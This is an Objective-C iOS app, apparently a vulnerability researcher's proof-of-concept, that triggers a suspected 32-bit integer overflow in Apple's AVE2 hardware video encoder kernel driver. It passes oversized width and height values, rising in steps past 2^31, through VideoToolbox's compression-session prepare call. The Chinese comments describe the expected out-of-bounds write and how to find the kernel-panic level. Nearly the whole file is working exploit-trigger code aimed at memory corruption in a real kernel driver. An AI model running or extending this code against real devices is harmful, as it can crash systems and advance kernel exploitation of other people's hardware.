//
//  vtprepare.m — 走最后一步：VTCompressionSessionPrepareToEncodeFrames
//
//  到目前为止已证实（真机 + syslog）：
//    app → VTCompressionSessionCreate(W,H,hevc) → videocodecd(PID 1969)
//    → IOServiceOpen(AppleAVE2Driver) **open 成功**（每次 create 对应一次 open/close）
//    VT 入口无尺寸上限（1×1 到 INT32_MAX×2 全 noErr）
//
//  还差：AVE2 的 IO_Prepare / IO_Start 才会进 AVE_Client_CheckInfo
//        （缺 iPixelProduct <= 2147483647 → 14 个 CalcBufSizeOf* 用 32 位 mul → 回绕 → 越界写）
//
//  本包分阶梯，**从最小剂量开始**，每级之间停 3 秒：
//    L0  1920×1080        基线（确认 Prepare 本身可用）
//    L1  16384×131072     正好 2^31（边界，理论上还没溢出）
//    L2  16384×131073     刚过 2^31 —— **最小溢出剂量**
//    L3  16384×262160     2 倍溢出
//    L4  65535×65535      最大方阵
//
//  ★ 每一级都是「Create → PrepareToEncodeFrames → Invalidate」三步，
//    不提交任何帧（因为 W×H 的像素缓冲根本分配不出来，也不需要 ——
//    CheckInfo 在 Prepare 阶段就会拿到宽高）。
//
//  ★ 如果某一级导致 kernel panic，屏幕会停在那一级之前，
//    重启后告诉我"最后打印到 L几"，那就是崩溃点。
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"VTPREP %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vtprepare.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    // 同步写屏（崩溃前保证已显示）
    dispatch_sync(gQ, ^{});
    dispatch_async(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightBold];
        }
    });
}

static const uint32_t kCMVideoCodecType_HEVC = 0x68766331;   // 'hvc1'

typedef void *VTCompressionSessionRef;
typedef int32_t (*fn_create_t)(void *, int32_t, int32_t, uint32_t,
                               void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_prepare_t)(VTCompressionSessionRef);
typedef void    (*fn_invalidate_t)(VTCompressionSessionRef);

static fn_create_t     p_create     = NULL;
static fn_prepare_t    p_prepare    = NULL;
static fn_invalidate_t p_invalidate = NULL;

static const char *osstatus_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12905: return "kVTPixelTransferNotSupportedErr";
        case -12906: return "kVTDecompressionFailedErr";
        case -12907: return "kVTBadDataErr";
        case -12908: return "kVTNotSupportedErr";
        case -12909: return "kVTPropertyNotSupportedErr";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        case -6661:  return "kCVReturnInvalidSize";
        case -6660:  return "kCVReturnInvalidArgument";
        default:     return "?";
    }
}

// 一级测试：Create → Prepare → Invalidate
static void run_level(int n, int32_t w, int32_t h, const char *desc)
{
    int64_t prod = (int64_t)w * (int64_t)h;
    double ratio = (double)prod / 2147483648.0;

    L(@"");
    L(@"========== L%d: %s ==========", n, desc);
    L(@"    %d x %d   W*H = %lld  (%.3f x 2^31)", w, h, (long long)prod, ratio);
    SetStatus([NSString stringWithFormat:@"L%d: %dx%d", n, w, h]);

    // ---- 1) Create ----
    VTCompressionSessionRef s = NULL;
    L(@"  [1] VTCompressionSessionCreate ...");
    int32_t st = p_create(NULL, w, h, kCMVideoCodecType_HEVC,
                          NULL, NULL, NULL, NULL, NULL, &s);
    L(@"      -> %d %s   session=%p", st, osstatus_name(st), s);
    if (st != 0 || !s) {
        L(@"      Create 失败，跳过本级的 Prepare");
        return;
    }

    // ---- 2) PrepareToEncodeFrames ★ 关键一步 ----
    L(@"  [2] VTCompressionSessionPrepareToEncodeFrames ...  ← ★ 关键");
    L(@"      （这一步会向 AVE2 发 IO_Prepare，触发 AVE_Client_CheckInfo）");
    st = p_prepare(s);
    L(@"      -> %d %s", st, osstatus_name(st));

    // ---- 3) Invalidate ----
    L(@"  [3] Invalidate ...");
    if (p_invalidate) p_invalidate(s);
    CFRelease((CFTypeRef)s);
    L(@"      完成");
}

static void run(void)
{
    L(@"===== VT PrepareToEncodeFrames — 阶梯触发 =====");
    L(@"uid=%d pid=%d", getuid(), getpid());
    L(@"");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    if (!vt) { L(@"VideoToolbox 加载失败: %s", dlerror()); SetStatus(@"加载失败"); return; }

    p_create     = (fn_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare    = (fn_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_invalidate = (fn_invalidate_t)dlsym(vt, "VTCompressionSessionInvalidate");

    L(@"[dlsym] Create     = %p", p_create);
    L(@"[dlsym] Prepare    = %p", p_prepare);
    L(@"[dlsym] Invalidate = %p", p_invalidate);

    if (!p_create || !p_prepare) {
        L(@"dlsym 失败，终止");
        SetStatus(@"dlsym 失败");
        return;
    }

    // ---- L0 基线 ----
    run_level(0, 1920, 1080, "baseline 1080p（确认 Prepare 可用）");
    sleep(3);

    // ---- L1 正好 2^31 ----
    run_level(1, 16384, 131072, "正好 2^31（边界，理论上还不溢出）");
    sleep(3);

    // ---- L2 最小溢出 ★ ----
    run_level(2, 16384, 131073, "★ 刚过 2^31 —— 最小溢出剂量");
    sleep(3);

    // ---- L3 2 倍 ----
    run_level(3, 16384, 262160, "2 倍溢出");
    sleep(3);

    // ---- L4 最大方阵 ----
    run_level(4, 65535, 65535, "最大方阵 65535^2");

    L(@"");
    L(@"===== 全部级别跑完，没有崩溃 =====");
    L(@"  ⇒ AVE2 在 Prepare 阶段没有因 W*H 溢出而崩");
    L(@"     可能原因：");
    L(@"       a) VT 在 Prepare 时截断/校验了尺寸，没把畸形值传给 AVE2");
    L(@"       b) AVE2 的 CheckInfo 在 Prepare 阶段没被调用（要 EncodeFrame 才走）");
    L(@"       c) 溢出发生了但落在仍可写的内存里（没触发 fault）");
    L(@"  ⇒ 下一步：看 syslog 里 IO_Prepare 有没有被调用、宽高是多少");

    SetStatus(@"完成，看日志");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vtprepare.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vtprepare...";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
